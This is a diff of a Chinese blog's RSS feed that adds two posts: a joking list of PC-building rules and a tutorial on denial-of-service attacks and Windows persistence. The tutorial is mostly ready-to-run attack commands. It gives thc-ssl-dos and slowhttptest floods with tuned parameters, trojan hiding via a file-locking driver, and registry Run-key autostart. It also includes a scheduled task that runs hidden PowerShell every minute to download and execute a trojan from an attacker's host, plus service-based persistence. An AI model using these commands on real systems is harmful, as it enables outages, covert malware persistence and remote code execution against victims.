@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Sun, 14 Dec 2025 22:06:09 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 16 Dec 2025 18:07:16 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>恰到好处的补完—《轻音少女》观后感</title>
         <link>https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/</link>
         <pubDate>Sat, 01 Nov 2025 09:58:38 +0800</pubDate>
@@ -152,6 +152,347 @@
     &gt;AriaNgGUI&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;PC端下载器:&lt;a class=&#34;link&#34; href=&#34;https://motrix.app/zh-CN/about&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Motrix&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>1.14 自启动和DOS攻击初步</title>
+        <link>https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/</link>
+        <pubDate>Tue, 16 Dec 2025 18:07:16 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/</guid>
+        <description>&lt;h2 id=&#34;dos拒绝服务攻击&#34;&gt;DOS拒绝服务攻击
+&lt;/h2&gt;&lt;h3 id=&#34;ssl-dos&#34;&gt;ssl-dos
+&lt;/h3&gt;&lt;p&gt;一般用于打击https网站，如果目标挂了CDN无效&lt;/p&gt;
+&lt;p&gt;安装：执行&lt;code&gt;sudo apt-get install thc-ssl-dos&lt;/code&gt;安装程序&lt;/p&gt;
+&lt;p&gt;攻击：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;thc-ssl-dos &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; --accept
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;慢速攻击&#34;&gt;慢速攻击
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;安装程序：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install openssl
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install libssl-dev
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install slowhttptest
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;slow-http-post攻击针对接受-post-请求的接口&#34;&gt;slow http Post攻击（针对接受 POST 请求的接口）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;攻击命令：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;slowhttptest -c &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; -B -g -o body_states -i &lt;span class=&#34;m&#34;&gt;110&lt;/span&gt; -r &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -s &lt;span class=&#34;m&#34;&gt;8192&lt;/span&gt; -t FAKEVERB -u http://&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -x &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; -p &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;参数解释：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;参数&lt;/th&gt;
+          &lt;th&gt;英文全称/含义&lt;/th&gt;
+          &lt;th&gt;具体作用&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-c 2000&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;connections&lt;/code&gt;（并发连接数）&lt;/td&gt;
+          &lt;td&gt;指定向目标服务器同时建立&lt;strong&gt;2000个并发HTTP连接&lt;/strong&gt;，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-B&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;Body attack&lt;/code&gt;（慢POST攻击）&lt;/td&gt;
+          &lt;td&gt;明确攻击类型为&lt;strong&gt;Slow POST（慢POST攻击）&lt;/strong&gt;（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-g&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;generate statistics&lt;/code&gt;（生成统计日志）&lt;/td&gt;
+          &lt;td&gt;启用日志记录功能，会生成&lt;strong&gt;CSV格式的原始数据文件&lt;/strong&gt;和&lt;strong&gt;HTML格式的可视化报告&lt;/strong&gt;，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-o body_states&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;output prefix&lt;/code&gt;（输出文件前缀）&lt;/td&gt;
+          &lt;td&gt;指定日志文件的前缀为&lt;code&gt;body_states&lt;/code&gt;，结合&lt;code&gt;-g&lt;/code&gt;参数，会生成&lt;code&gt;body_states.csv&lt;/code&gt;（数据文件）和&lt;code&gt;body_states.html&lt;/code&gt;（可视化报告）两个文件。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-i 110&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;interval&lt;/code&gt;（数据块发送间隔）&lt;/td&gt;
+          &lt;td&gt;指定每次发送请求体数据块之间的&lt;strong&gt;时间间隔为110毫秒（ms）&lt;/strong&gt;。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-r 200&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;rate&lt;/code&gt;（每秒新建连接数）&lt;/td&gt;
+          &lt;td&gt;指定&lt;strong&gt;每秒向目标新建200个连接&lt;/strong&gt;，直到达到&lt;code&gt;-c 2000&lt;/code&gt;的并发连接上限（约10秒可达到2000个并发）。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-s 8192&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;content length size&lt;/code&gt;（内容长度）&lt;/td&gt;
+          &lt;td&gt;在HTTP请求头的&lt;code&gt;Content-Length&lt;/code&gt;字段中声明&lt;strong&gt;预期发送8192字节（8KB）的请求体&lt;/strong&gt;，欺骗服务器保持连接等待接收完整数据。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-t FAKEVERB&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;HTTP verb&lt;/code&gt;（HTTP方法）&lt;/td&gt;
+          &lt;td&gt;指定HTTP请求使用&lt;strong&gt;伪造的非标准方法&lt;/strong&gt;&lt;code&gt;FAKEVERB&lt;/code&gt;（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-u http://[目标ip]&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;URL&lt;/code&gt;（目标地址）&lt;/td&gt;
+          &lt;td&gt;指定&lt;strong&gt;攻击目标的URL&lt;/strong&gt;，需将&lt;code&gt;[目标ip]&lt;/code&gt;替换为实际的服务器IP或域名。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-x 10&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;block size&lt;/code&gt;（数据块长度）&lt;/td&gt;
+          &lt;td&gt;指定每次向服务器发送的&lt;strong&gt;请求体数据块长度为10字节&lt;/strong&gt;。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;-p 3&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;probe timeout&lt;/code&gt;（探测超时时间）&lt;/td&gt;
+          &lt;td&gt;在发起正式攻击前，工具会先发送一个&lt;strong&gt;探测请求&lt;/strong&gt;检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;原理解析：&lt;/strong&gt; 发送 POST 请求时，在请求头中声明&lt;code&gt;Content-Length: 8192&lt;/code&gt;（要发 8KB 数据），然后以 &lt;strong&gt;10 字节 / 110ms&lt;/strong&gt; 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。&lt;/p&gt;
+&lt;h4 id=&#34;slowloris攻击针对所有接受-get-请求的页面基本通用&#34;&gt;slowloris攻击（针对所有接受 GET 请求的页面，基本通用）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;攻击命令：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;slowhttptest -c &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; -H -g -o my_header_states -i &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; -r &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -s &lt;span class=&#34;m&#34;&gt;8192&lt;/span&gt; -t GET -u http://&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -x &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; -p &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;原理解析：&lt;/strong&gt; 发送 GET 请求时，故意 &lt;strong&gt;逐个缓慢发送 HTTP 请求头字段&lt;/strong&gt; （如&lt;code&gt;Host:&lt;/code&gt;、&lt;code&gt;User-Agent:&lt;/code&gt;、&lt;code&gt;Accept:&lt;/code&gt;等），每个字段大小为 24 字节，发送间隔仅 10ms（看似快，但对服务器的连接处理机制而言，仍足够慢以占用连接），且不发送请求头的结束标记（&lt;code&gt;\r\n\r\n&lt;/code&gt;），让服务器认为请求头还在传输中，从而一直保持连接等待完整的请求头。&lt;/p&gt;
+&lt;h2 id=&#34;其他内容&#34;&gt;其他内容
+&lt;/h2&gt;&lt;h3 id=&#34;驱动级文件保护软件&#34;&gt;驱动级文件保护软件
+&lt;/h3&gt;&lt;p&gt;使用 **Easy File Locker ** 可以对我们的文件进行驱动级的保护和隐藏，当然包括我们放在目标上的木马程序。&lt;/p&gt;
+&lt;p&gt;当配置完毕（或我们自己中招）后，我们可以检查下面两个文件夹看看是否真的生效了&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:/Windows/xlfks.xxx&lt;/code&gt;(包括但不限于dat、dll、ini、log&amp;hellip;&amp;hellip;)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:/Windows/system32/drivers/xlkfs.sys&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;如果检查出上面两个文件就说明是驱动级的文件隐藏&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;如何清除：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;查询服务状态&lt;code&gt;sc qc xlkfs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;停止服务&lt;code&gt;net stop xlkfs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;删除服务&lt;code&gt;sc delete xlkfs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;找到上面的两位个文件残余并删除&lt;/li&gt;
+&lt;li&gt;删除木马程序&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;注册表自启动&#34;&gt;注册表自启动
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Win+R&lt;/code&gt;输入regedit回车打开注册表&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;路径一：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;找到路径为&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;路径二：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;找到路径为&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;路径三：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;找到路径为&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;路径四：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;找到路径为&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;路径五：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;找到路径为&lt;code&gt;HKEY_CURRENT_USER\Environment&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;**说明：**路径三、四、五内的条目都是Windows在登录时会执行的任务&lt;/p&gt;
+&lt;p&gt;右键新建字符串值，在数据中输入要自启动的文件路径和启动参数&lt;/p&gt;
+&lt;h3 id=&#34;计划任务启动&#34;&gt;计划任务启动
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sc &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;示例名称&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell.exe -nop -w hidden
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;-c \&amp;#34;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IEX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;new-object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webclient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://[攻击机ip]/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;[木马文件]&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;))\&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;上面的代码会让目标每分钟在后台下载并执行攻击者的木马程序&lt;/p&gt;
+&lt;h3 id=&#34;服务启动&#34;&gt;服务启动
+&lt;/h3&gt;&lt;p&gt;增加一个服务&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sc create &amp;quot;示例名称&amp;quot; binpath= &amp;quot;cmd /c start 具体命令&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;设置服务描述&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sc description 示例名称 &amp;quot;示例描述&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;设置自动启动&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sc config 示例名称 start= auto&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;开启服务&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net start 示例名称&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>装机法40条 (Laws for Computer Assembly)</title>
+        <link>https://www.retr0.xyz/p/%E8%A3%85%E6%9C%BA%E6%B3%9540%E6%9D%A1-laws-for-computer-assembly/</link>
+        <pubDate>Tue, 16 Dec 2025 11:40:47 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/%E8%A3%85%E6%9C%BA%E6%B3%9540%E6%9D%A1-laws-for-computer-assembly/</guid>
+        <description>&lt;ol start=&#34;0&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;请熟读背诵并严格遵守本条例。&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如果一个设备现在运行得很完美，就不要手贱去调整它。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要空腹装机，务必保证开工前有足够的热量摄入。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要在夜晚睡前折腾设备，除非你今晚并不打算睡觉。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;新设备装箱前务必在外面做最小系统亮机测试。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;将主板挡板摆在主板旁边最显眼的位置，并在最小系统亮机后第一时间安装。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;务必撕去散热器的保护膜，禁止使用牙膏等物品替代。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;均匀适量涂抹品牌硅脂，禁止涂针脚与底座。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;硅脂应且仅应涂抹在CPU表面，禁止涂针脚与底座。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;防呆并不防傻，禁止大力出奇迹。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内存应首先选择远离CPU的插槽安装。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内存数量：宁双不单，宁二不四。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ATX主板装不进ITX机箱，ITX主板也不建议装进ATX机箱。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用正规散热器，禁止使用萝卜和水缸等物品代替。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用品牌电源，禁止使用红星电源等高爆设备。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;系统应尽量安装在固态硬盘里。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要使用玻璃等易碎材质侧板。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;间歇性清灰是必须的，频率取决于设备环境的洁净程度。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;购买设备前务必仔细核对显卡、散热、机箱等配件的长宽高以及各类线材的长度&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;显存导热硅片必须使用和原装同样厚度，拆显卡前请复习第1条内容。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工作空间距离一米内不要放置危险物品，如敞口的水杯、猫。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;水冷有风险，选择需谨慎。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;拆机前应先烤机，并保证散热器轻微扭动取下，避免连根拔起。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;重启解决90%的问题，重装解决99%的问题，重买解决100%的问题。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;电子产品长期来看价格只会越来越低，杜绝“精准下山”的想法。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;备份是最安全且唯一真正安全的数据保存方法。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如果不擅长空间管理，请保证C盘分区尽量大。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Linux是个好东西，对于且仅对于会用的人来说。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要照抄网上的超频作业，因为每一个元件的“体质”都不一样。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;显卡紧挨的PCIE槽不要插面积大的设备挡风。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;扎带和双面胶有时比螺丝好用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;机箱不重要，安全的设备安放环境才重要。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要给小白组装机，更不要给他提供硬件或软件，让他去买品牌机或者笔记本。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;整机功率应不高于电源标称功率的75%。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;禁止在机箱内摆放熔点低的装饰物。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;涉及重要工作生产内容的设备应配置UPS。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;水洗设备后务必保证完全干燥再通电，水洗前请复习第1条。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要用手触摸高速旋转的风扇。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不要太过热心当好人，也不要试图教育或改变他人。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;快递设备务必拔下显卡和塔扇等设备，并做好填充和包装，允许时使用静电袋。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;style&gt;
+ .rgb-sentence {
+  font-size: inherit;
+  font-weight: 600;
+  display: inline-block;
+  position: relative;
+  background: linear-gradient(90deg, #ff3333, #33ff33, #3333ff, #ff3333);
+  background-size: 200% 100%;
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent; 
+  text-shadow: 0 0 8px rgba(255,255,255,0.5), 0 0 12px currentColor;
+  animation: sentenceFlow 2s linear infinite;
+ }
+ @keyframes sentenceFlow {
+  0% { background-position: 0% 50%; }
+  100% { background-position: 200% 50%; }
+ }
+ .rgb-sentence:hover {
+  animation: sentenceFlowFast 2s linear infinite;
+  text-shadow: 0 0 12px rgba(255,255,255,0.8), 0 0 18px currentColor, 0 0 24px currentColor;
+ }
